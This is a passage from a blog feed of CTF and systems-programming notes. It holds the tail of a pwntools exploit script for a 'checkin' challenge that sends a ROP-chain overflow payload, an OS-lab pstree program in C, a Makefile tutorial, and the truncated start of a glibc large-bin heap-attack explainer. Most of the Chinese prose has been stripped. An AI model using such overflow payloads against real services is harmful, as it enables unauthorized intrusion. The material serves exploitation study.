class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./checkin&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="comment"># db(&#x27;b *0x401338&#x27;)</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x401340&#x27;)</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x401341 &#x27;)</span></span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x666666</span>)+p64(<span class="number">0x555555</span>)+p64(rop.rdi.address)+p64(<span class="number">0x4040C0</span>)+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x7d8</span>-<span class="number">0x20</span>)+p64(<span class="number">0x666666</span>)</span><br><span class="line">payload=padding</span><br><span class="line">sla(<span class="string">b&#x27;eckin\n&#x27;</span>,payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Tls Hijack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NJUOS:M1 pstree</title>
      <link href="/2023/03/25/NJUOS-M1-pstree/"/>
      <url>/2023/03/25/NJUOS-M1-pstree/</url>
      
        <content type="html"><![CDATA[<p><a href="http://jyywiki.cn/OS/2022/labs/M1">http://jyywiki.cn/OS/2022/labs/M1</a></p><p><strong>Keep it simple, stupid &amp;&amp; Everything is a file.</strong></p><p>stracepstree</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>proc  (procfs)  Unix  </p><p>dirent.hfunc <a href="https://man7.org/linux/man-pages/man0/dirent.h.0p.html">https://man7.org/linux/man-pages/man0/dirent.h.0p.html</a></p><p>opendirreaddirclosedir</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line">DIR *<span class="title function_">opendir</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name)</span>;</span><br><span class="line">name</span><br><span class="line"><span class="keyword">struct</span> dirent *<span class="title function_">readdir</span><span class="params">(DIR *dir)</span>;</span><br><span class="line">readdirdirentdirend-of-file<span class="literal">NULL</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">closedir</span><span class="params">(DIR *dir)</span>;</span><br><span class="line">closedirdir<span class="number">0</span><span class="number">-1</span>errno</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> &#123;</span></span><br><span class="line">        <span class="type">ino_t</span>          d_ino;       <span class="comment">/* inode number */</span></span><br><span class="line">        <span class="type">off_t</span>          d_off;       <span class="comment">/* offset to the next dirent */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span> d_reclen;    <span class="comment">/* length of this record */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span>  d_type;      <span class="comment">/* type of file */</span></span><br><span class="line">        <span class="type">char</span>           d_name[<span class="number">256</span>]; <span class="comment">/* filename */</span></span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p>&#x2F;proc&#x2F;PID&#x2F;stat Linux &#x2F;proc&#x2F;PID&#x2F;stat  PID </p><p>&#x2F;proc&#x2F;PID&#x2F;statusstat</p><p>&#x2F;proc&#x2F;PID&#x2F;task PID  ID ID CPU </p><p>&#x2F;proc&#x2F;PID&#x2F;statppid</p><p> &#x2F;proc&#x2F;PID&#x2F;stat </p><ul><li>pid ID</li><li>comm</li><li>state</li><li>ppid ID</li><li>pgrp ID</li><li>session ID</li><li>tty_nr</li><li>tpgid ID</li><li>flags</li><li>minflt</li><li>cminflt</li><li>majflt</li><li>cmajflt</li><li>utime</li><li>stime</li><li>cutime</li></ul><h3 id=""><a href="#" class="headerlink" title=""></a></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">processtree</span> &#123;</span></span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">char</span> pidname[<span class="number">36</span>];</span><br><span class="line">&#125; Processtree;</span><br></pre></td></tr></table></figure><p>11root</p><h3 id="code"><a href="#code" class="headerlink" title="code"></a>code</h3><blockquote><p>#include &lt;assert.h&gt;</p><p>assert(exp)exp0stderr abort </p><p>#include &lt;assert.h&gt;#define NDEBUGassert</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipinfo</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> pidname[<span class="number">36</span>];</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">pid_t</span> ppid;</span><br><span class="line">&#125; Pipinfo;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">processtree</span> &#123;</span></span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">char</span> pidname[<span class="number">36</span>];</span><br><span class="line">&#125; Processtree;</span><br><span class="line"></span><br><span class="line">Pipinfo allpid[<span class="number">666</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">int</span> pidcount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setProcessInfo</span><span class="params">()</span>;</span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">getPpid</span><span class="params">(<span class="type">char</span>*, <span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">creatTree</span><span class="params">(<span class="type">bool</span> pid, Processtree* root, <span class="type">int</span> paddinglen)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">findAllchild</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">int</span>* childrenar)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">    setProcessInfo();</span><br><span class="line">    Processtree* root = (Processtree*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Processtree));</span><br><span class="line">    root-&gt;pid = allpid[<span class="number">0</span>].pid;</span><br><span class="line">    <span class="built_in">strcpy</span>(root-&gt;pidname, allpid[<span class="number">0</span>].pidname);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> opt;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">option</span> <span class="title">longopt</span>[] =</span> &#123;</span><br><span class="line">        &#123;<span class="string">&quot;show-pids&quot;</span>,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="string">&#x27;p&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;numeric-sort&quot;</span>,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="string">&#x27;n&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;version&quot;</span>,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="string">&#x27;V&#x27;</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">switch</span> (opt = getopt_long(argc, argv, <span class="string">&quot;Vpnh&quot;</span>, longopt, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Grxer 2023 3 25\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:</span><br><span class="line">        creatTree(<span class="literal">true</span>, root, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">        creatTree(<span class="literal">false</span>, root, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (optind == argc) &#123;</span><br><span class="line">        creatTree(<span class="literal">false</span>, root, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;pstree -h for help&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setProcessInfo</span><span class="params">()</span> &#123;</span><br><span class="line">    DIR* proc = opendir(<span class="string">&quot;/proc&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!proc) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;Can &#x27;t open /proc/&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> pid = <span class="number">0</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span>* <span class="title">entry</span>;</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">NULL</span> != (entry = readdir(proc))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> == (pid = atoi(entry-&gt;d_name)))</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="comment">// printf(&quot;%d\n&quot;, pid);</span></span><br><span class="line">            allpid[pidcount].pid = pid;</span><br><span class="line">            allpid[pidcount].ppid = getPpid(entry-&gt;d_name, allpid[pidcount].pidname);</span><br><span class="line">            <span class="comment">// printf(&quot;%d:%s:%d\n&quot;, allpid[pidcount].pid, allpid[pidcount].pidname, allpid[pidcount].ppid);</span></span><br><span class="line">            pidcount++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    closedir(proc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">getPpid</span><span class="params">(<span class="type">char</span>* pid, <span class="type">char</span>* name)</span> &#123;</span><br><span class="line">    <span class="type">char</span> processpath[<span class="number">30</span>] = <span class="string">&quot;/proc/&quot;</span>;</span><br><span class="line">    <span class="built_in">strcat</span>(processpath, pid);</span><br><span class="line">    <span class="built_in">strcat</span>(processpath, <span class="string">&quot;/stat&quot;</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;%s\n&quot;, processpath);</span></span><br><span class="line">    FILE* fp = fopen(processpath, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp) &#123;</span><br><span class="line">        <span class="type">char</span> i;</span><br><span class="line">        <span class="type">pid_t</span> _pid, ppid;</span><br><span class="line">        <span class="built_in">fscanf</span>(fp, <span class="string">&quot;%d (%s %c %d&quot;</span>, &amp;_pid, name, &amp;i, &amp;ppid);</span><br><span class="line">        name[<span class="built_in">strlen</span>(name) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// printf(&quot;%d:%s:%d\n&quot;, _pid, name, ppid);</span></span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="keyword">return</span> ppid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s %s %s&quot;</span>, <span class="string">&quot;open&quot;</span>, processpath, <span class="string">&quot;fail&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">creatTree</span><span class="params">(<span class="type">bool</span> pidflag, Processtree* root, <span class="type">int</span> paddinglen)</span> &#123;</span><br><span class="line">    <span class="type">int</span> childrens[<span class="number">666</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    findAllchild(root-&gt;pid, childrens);</span><br><span class="line">    <span class="type">char</span> str[<span class="number">60</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">if</span> (childrens[<span class="number">0</span>] == <span class="number">0</span>) &#123;<span class="comment">//</span></span><br><span class="line">        <span class="keyword">if</span> (pidflag)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s(%d)&quot;</span>, root-&gt;pidname, root-&gt;pid);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, root-&gt;pidname);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pidflag)</span><br><span class="line">        <span class="built_in">sprintf</span>(str, <span class="string">&quot;%s(%d)-+-&quot;</span>, root-&gt;pidname, root-&gt;pid);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">sprintf</span>(str, <span class="string">&quot;%s-+-&quot;</span>, root-&gt;pidname);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">666</span> &amp;&amp; <span class="number">0</span> != childrens[i]; i++) &#123;</span><br><span class="line">        Processtree* temp = (Processtree*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Processtree));</span><br><span class="line">        <span class="keyword">if</span> (temp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;malloc failed&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        temp-&gt;pid = allpid[childrens[i]].pid;</span><br><span class="line">        <span class="built_in">strcpy</span>(temp-&gt;pidname, allpid[childrens[i]].pidname);</span><br><span class="line">        creatTree(pidflag, temp, <span class="built_in">strlen</span>(str) + paddinglen);<span class="comment">//</span></span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">1</span> &lt; <span class="number">500</span> &amp;&amp; childrens[i + <span class="number">1</span>] != <span class="number">0</span>)<span class="comment">//</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str) + paddinglen; i++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;|-&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(root);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// csapp 5.8 </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">findAllchild</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">int</span>* childrenar)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (;i &lt; pidcount - <span class="number">1</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (allpid[i].ppid == pid)</span><br><span class="line">            childrenar[index++] = i;</span><br><span class="line">        <span class="keyword">if</span> (allpid[i + <span class="number">1</span>].ppid == pid)</span><br><span class="line">            childrenar[index++] = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; pidcount; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (allpid[i].ppid == pid)</span><br><span class="line">            childrenar[index++] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> NJUOS Lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How 2 GNU Makefile</title>
      <link href="/2023/03/25/How2Makefile/"/>
      <url>/2023/03/25/How2Makefile/</url>
      
        <content type="html"><![CDATA[<h2 id="Makefile-advantage"><a href="#Makefile-advantage" class="headerlink" title="Makefile advantage"></a>Makefile advantage</h2><ol><li></li><li></li><li>Makefile</li></ol><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><strong>Makefile</strong><strong>makefile</strong></p><p> make -f filename</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">&lt;target&gt; : &lt;prerequisites&gt; </span><br><span class="line">[tab]  &lt;commands&gt;</span><br></pre></td></tr></table></figure><ul><li><p>targetprerequisitestargetcommands</p></li><li><p>\</p></li><li><p> #</p></li><li><p>make Makefile</p></li><li><p>.PHONY </p><blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.PHONY: clean</span><br><span class="line">clean:</span><br><span class="line">        <span class="built_in">rm</span> *.o temp</span><br><span class="line"><span class="comment"># make clean</span></span><br></pre></td></tr></table></figure><p>cleanmakecleanclean</p></blockquote></li><li><p>commands</p><blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span>: file1 file2 file3</span><br></pre></td></tr></table></figure><p>make source</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ make file1</span><br><span class="line">$ make file2</span><br><span class="line">$ make file3</span><br></pre></td></tr></table></figure></blockquote></li><li><p>@commands</p></li><li><p>%</p><blockquote><p>%main.c, func1.c, func2.c</p><p><code>%.o:%.c  $(CC) c $&lt; -o $@</code></p></blockquote></li><li><p><strong>-</strong> </p></li><li><p>include<filename> Makefile</filename></p></li></ul><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>cmacro</p><p>&#x3D;</p><p>$()</p><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">VARIABLE = value</span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br><span class="line">VARIABLE := value</span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br><span class="line">VARIABLE ?= value</span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br><span class="line">VARIABLE += value</span><br><span class="line"><span class="comment"># </span></span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="built_in">$</span>@    </span><br><span class="line"></span><br><span class="line"><span class="built_in">$</span>&lt;     </span><br><span class="line"></span><br><span class="line"><span class="built_in">$</span><span class="built_in">^</span>    </span><br><span class="line">app: main.c func1.c fun2.c</span><br><span class="line">    gcc <span class="built_in">$</span><span class="built_in">^</span> - o <span class="built_in">$</span>@</span><br><span class="line"><span class="built_in">$</span><span class="built_in">^</span>main.c func1.c fun2.c<span class="built_in">$</span>&lt;main.c<span class="built_in">$</span>@app</span><br><span class="line"></span><br><span class="line"><span class="built_in">$</span>* </span><br><span class="line"></span><br><span class="line"><span class="built_in">$</span>+ </span><br><span class="line"></span><br><span class="line"><span class="built_in">$</span>? </span><br><span class="line"></span><br><span class="line"><span class="built_in">$</span>@  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><strong>wildcard:</strong></p><p>+</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">src = $wildcard ./src/*.c)</span><br></pre></td></tr></table></figure><p>.&#x2F;src .csrc</p><p><strong>patsubst:</strong></p><p>src.c .oobj</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">obj = $(patsubst %.c ,%.o ,$(src))</span><br></pre></td></tr></table></figure><p>src.c.o</p><p>.oobj</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ob = $(patsubst ./src/%.c, ./obj/%.o, $(src))</span><br></pre></td></tr></table></figure><p><strong>subst</strong></p><p>subst </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$(subst from,to,text)</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">$(subst ee,EE,feet on the street)</span><br><span class="line">&quot;feet on the street&quot;&quot;fEEt on the strEEt&quot;</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello/</span><br><span class="line">main.c</span><br><span class="line">factorial.c</span><br><span class="line">printhello.c</span><br><span class="line">functions.h</span><br></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CC = gcc</span><br><span class="line">TARGET = hello</span><br><span class="line">SRC=<span class="variable">$(<span class="built_in">wildcard</span> ./*.c)</span></span><br><span class="line">OBJ=<span class="variable">$(<span class="built_in">patsubst</span> ./%.c,./%.o,<span class="variable">$(SRC)</span>)</span></span><br><span class="line"></span><br><span class="line">GCCFLAGS= -c -Wall</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">    <span class="variable">$(CC)</span> -o <span class="variable">$@</span> <span class="variable">$^</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.o:%.c</span></span><br><span class="line">    <span class="variable">$(CC)</span> <span class="variable">$(GCCFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line">clean :</span><br><span class="line">    rm -f *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Makefile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Large Bin Attack</title>
      <link href="/2023/03/24/Large-bin-attack/"/>
      <url>/2023/03/24/Large-bin-attack/</url>
      
        <content type="html"><![CDATA[<h2 id="Large-Bin-Attack"><a href="#Large-Bin-Attack" class="headerlink" title="Large Bin Attack"></a>Large Bin Attack</h2><p><img src="/2023/03/24/Large-bin-attack/image-20230812163127239.png" alt="image-20230812163127239"></p><p>mallocfast binsmall binchunkUnsorted binchunkchunksizechunkbin32504(0x1f8)largebin641008(0x3f0)largebinsmallbin</p><p>largebinunsortedbin<code> struct malloc_chunk* fd_nextsize;</code>chunk<code> struct malloc_chunk* bk_nextsize;</code>chunk</p><h2 id="Large-Bin"><a href="#Large-Bin" class="headerlink" title="Large Bin"></a>Large Bin</h2><ol><li>,largebinchunk</li><li>free</li><li>fd_nextsizebk_nextsizefd_nextsizebk_nextsize0</li><li>sizechunkbk_nextsizechunksizechunkfd_nextsizechunk</li></ol><h2 id="2-23malloc-c-remove-from-unsorted-list"><a href="#2-23malloc-c-remove-from-unsorted-list" class="headerlink" title="2.23malloc.c remove from unsorted list"></a>2.23malloc.c remove from unsorted list</h2><p>victimunsortedbinchunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size == nb)</span><br><span class="line">&#123;</span><br><span class="line">    set_inuse_bit_at_offset (victim, size);</span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (size)) <span class="comment">//sizesmallbin</span></span><br><span class="line">&#123;</span><br><span class="line">    victim_index = smallbin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;<span class="comment">//bckfdchunkbkchunk</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//largebin</span></span><br><span class="line">&#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">    <span class="keyword">if</span> (fwd != bck)<span class="comment">//largebinchunk</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">        size |= PREV_INUSE;</span><br><span class="line">        <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">        assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">        &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)<span class="comment">//victim-&gt;size&gt;=</span></span><br><span class="line">            &#123;</span><br><span class="line">                fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)<span class="comment">//</span></span><br><span class="line">                <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span><span class="comment">// victim-&gt;size &gt; fwd-&gt;size</span></span><br><span class="line">            &#123;</span><br><span class="line">                victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        victim-&gt;fd_nextsize = 